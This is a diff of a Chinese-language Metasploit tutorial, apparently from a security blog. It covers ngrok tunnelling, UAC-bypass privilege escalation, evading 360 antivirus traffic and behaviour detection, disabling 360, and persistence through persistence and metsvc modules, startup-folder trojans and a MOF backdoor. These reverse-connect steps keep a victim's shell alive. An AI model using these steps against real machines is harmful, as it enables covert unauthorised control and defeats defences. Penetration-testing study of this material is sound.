@@ -246,7 +246,7 @@ use exploit/windows/smb/psexec
 ![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片30.png)  
 ngrok 是一个反向代理，将某个数据流连接到一个公共端点，然后再通过这个公共端点反向连接到本地某个端口，因为ngrok每次使用的外网地址会变化，而sunny-ngrok因为每次是固定外网地址，所以使用sunny-ngrok来实现内网穿透。
 使用方法：1.https://www.ngrok.cc注册账号  
-![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片31.png) 
+![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片31.png)
 ![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片32.png)  
 进入隧道管理，然后点开通隧道，选“香港Ngrok 200M VIP服务器”或“香港Ngrok免费服务器”。  
 ![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片33.png)  
@@ -297,7 +297,6 @@ use exploit/windows/local/bypassuac
 漏洞提权的操作和那个相似，也会返回一个新的会话。  
 相关模块还有很多，大家可以去exploit/windows/local里面去找。当然如果有目标主机的控制权，可以以管理员身份运行木马，这样提权比较方便。
 #### 4.6.2 Meterpreter免杀对抗
-
 1.对抗流量监测  
 前面讲的对木马的免杀处理是为了躲避杀软的静态检查，现在来说说如何躲避杀软的流量监测，因为meterpreter在渗透领域的出名度，导致了它的免杀脆弱性，各大杀软都会对它进行分析与查杀，虽然meterpreter网络通信协议采用tlv封装，但是因为其传输的特征码，仍会被流量监测发现：  
 ![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片51.png)
@@ -315,27 +314,28 @@ set exitonsession false（必填项！）
 ![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片56.png)  
 可以看出，meterpreter对数据流进行了加密。这样就避开了一些杀软的流量监测，在渗透测试中起到了很好的隐蔽性。
 对抗行为分析
-对抗行为分析在国内最烦人的就是360了，360在行为分析方面做得的确很好，比如现在拿到了sessions会话，我们打开目标摄像头：
-
-cmd里net user：
-
-
-利用漏洞进行提权时：
-
-会话维持时：
-
+对抗行为分析在国内最烦人的就是360了，360在行为分析方面做得的确很好，比如现在拿到了sessions会话，我们打开目标摄像头：  
+![对抗](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片57.png)  
+cmd里net user：  
+![对抗](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片58.png)  
+利用漏洞进行提权时：  
+![对抗](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片59.png)  
+会话维持时：  
+![对抗](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片61.png)  
 所以说对于这种行为分析，的确让人很棘手，所以最后的办法就是想办法关闭360了（zhudongfangyu.exe）。
 攻略：
-
-4.6.3 Meterpreter会话维持
-
+想办法提权，要关闭360得达到驱动级才行，因为提权又操作了注册表等，360又会报毒，所以如果主机开了3389然后你又恰巧由管理员账号就是最好的了。  
+#### 4.6.3 Meterpreter会话维持
 meterpreter会话维持最基本的两个模块：
 Persistence（对注册表进行操作，免杀效果极差）  
 ![维持](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片61.png)  
-命令：run persistence –X（开机自启） –i (回连时间间隔)–p（回连端口）-r（回连ip地址） 
-Metsvc
-命令：run metsvc
-这个模块实在目标机装一个名为meterpreter的服务，然后可以对目标进行回连
+命令：  
+````
+run persistence –X（开机自启） –i (回连时间间隔)–p（回连端口）-r（回连ip地址）
+```   
+Metsvc  
+命令：run metsvc  
+这个模块实在目标机安装一个名为meterpreter的服务，然后可以对目标进行回连。  
 回连命令：  
 ```
 msfconsole
@@ -350,9 +350,9 @@ Winxp：
 将免杀马放入程序---附件---启动里面，然后目标主机每次开机都会启动我们的免杀马，并回连shell
 其他较高版本：（来自互联网）  
 ![维持](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片62.png)  
-Msf之mof后门（现已无法免杀）
-模块已经给出：
-将里面的persistence/mof_ps_persist.rb放置到msf安装路径metasploit-framework\embedded\framework\modules\post\windows里面（windows）
+Msf之mof后门（现已无法免杀）  
+模块已经给出：  
+将里面的persistence/mof_ps_persist.rb放置到msf安装路径metasploit-framework\embedded\framework\modules\post\windows里面（windows）  
 在得到会话后，将会话放置到后台，然后输入：  
 ```
 use post/windows/mof_ps_persist
